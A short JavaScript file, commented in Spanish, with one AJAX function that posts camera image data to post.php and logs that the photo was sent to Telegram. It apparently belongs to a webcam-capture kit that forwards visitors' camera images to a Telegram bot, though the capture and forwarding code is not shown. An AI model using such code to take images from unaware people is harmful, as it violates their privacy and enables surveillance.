// ajax.js: función para enviar imágenes de la cámara a post.php
function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'post.php',
        dataType: 'json',
        async: false,
        success: function(response){
            console.log("Foto enviada a Telegram:", response);
        },
        error: function(err){
            console.error("Error enviando la foto:", err);
        }
    });
}
